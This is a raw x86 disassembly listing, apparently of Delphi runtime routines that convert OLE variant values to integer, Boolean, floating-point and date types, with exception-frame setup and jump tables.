push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412f3c
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4043a0
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_4086bc
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4108b5
lea eax [ ebp - 0x1c ]
call sub_404118
lea eax [ ebp - 0xc ]
call sub_4047f8
retn
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ ebp - 0x18 ]
call sub_402abc
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov dx [ ebx ]
mov cx 0x14
call sub_40f158
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax ebx
call sub_410f74
and eax 0x7f
xor edx edx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
sub_4108c0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410917
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f824
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_410978
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41091e
lea eax [ ebp - 0x18 ]
call sub_40f4fc
retn
sub_41092c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414a10
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x14
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_410978
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_410d84
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4109ab ]
mov eax [ ebp - 0x4 ]
call sub_4107c0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402abc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402abc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402abc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402abc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4107c0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410978
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410714
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4108c0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov dx 0x14
mov ax 0x1
call sub_40ecc4
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41092c
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_410714
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_410714
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_410bcf ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402abc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402abc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402abc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402abc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4107c0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410978
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_410dbc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410e73
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412f3c
lea eax [ ebp - 0xa ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4043a0
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x1 ]
call sub_4087a8
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410e7a
lea eax [ ebp - 0x10 ]
call sub_404118
lea eax [ ebp - 0x8 ]
call sub_4047f8
retn
mov dx [ ebx ]
mov cx 0xb
mov eax 0x80020005
call sub_40f158
jmp r-xdata
mov dx [ ebx ]
mov cx 0xb
call sub_40f158
cmp [ ebp - 0xa ] 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
jmp r-xdata
sub_410e84
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0xb
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0xb
call sub_40f158
cmp [ esp + 0x8 ] 0x1
sbb eax eax
inc eax
add esp 0x10
pop ebx
retn
sub_410ec4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410f18
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x11 ]
call sub_40f824
lea eax [ ebp - 0x11 ]
call [ rw-data ]
lea eax [ ebp - 0x11 ]
call sub_410f74
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410f1f
lea eax [ ebp - 0x11 ]
call sub_40f4fc
retn
sub_410f28
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414a10
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0xb
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
cmp [ esp + 0xc ] 0x1
sbb eax eax
inc eax
mov [ edi ] al
sub_410f74
push ebx
push ecx
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410f8e ]
mov eax ebx
call sub_410dbc
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fild [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410dbc
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410f74
mov [ esp ] al
jmp r-xdata
mov eax ebx
call sub_410e84
mov [ esp ] al
jmp r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_410ec4
mov [ esp ] al
jmp r-xdata
jmp r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov dx 0xb
mov ax 0x1
call sub_40ecc4
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_410f28
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_410e84
mov [ esp ] al
mov eax ebx
call sub_410e84
mov [ esp ] al
jmp r-xdata
jmp [ eax * 4 + jump_table_411150 ]
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410dbc
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410f74
mov [ esp ] al
jmp r-xdata
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
sub_4112c8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41137d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412f3c
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4043a0
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_409a0c
test al al
je r-xdata
sub edx 0x7ffdfffb
jne r-xdata
mov dx [ ebx ]
mov cx 0x5
mov eax 0x80020005
call sub_40f158
jmp r-xdata
fld [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov dx [ ebx ]
mov cx 0x5
call sub_40f158
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411384
lea eax [ ebp - 0x1c ]
call sub_404118
lea eax [ ebp - 0xc ]
call sub_4047f8
retn
sub_41138c
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x5
call sub_40f158
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_4113d8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41142d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f824
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411488
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411434
lea eax [ ebp - 0x18 ]
call sub_40f4fc
retn
sub_41143c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414a10
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x5
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411488
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4114a4 ]
mov eax ebx
call sub_4112c8
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_4112c8
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411488
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_41138c
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_4113d8
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x5
mov ax 0x1
call sub_40ecc4
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_41143c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_41138c
fstp [ esp ]
fwait
mov eax ebx
call sub_41138c
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_411681 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_4112c8
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411488
fstp [ esp ]
fwait
jmp r-xdata
sub_411820
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x14
ja r-xdata
xor eax eax
push ebp
push sub_411985
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_411488
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_411842 ]
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x14 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x4
mov ax 0x1
call sub_40ecc4
sub_4119b0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411a8c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412f3c
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4043a0
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_40b45c
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411a93
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_40413c
lea eax [ ebp - 0xc ]
call sub_4047f8
retn
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_4043a0
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
call sub_409a28
test al al
je r-xdata
mov dx [ ebx ]
mov cx 0x7
call sub_40f158
jmp r-xdata
mov dx [ ebx ]
mov cx 0x7
mov eax 0x80020005
call sub_40f158
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_411a9c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x7
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40f158
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411afc
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x7
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40f158
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_411b48
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411b9d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
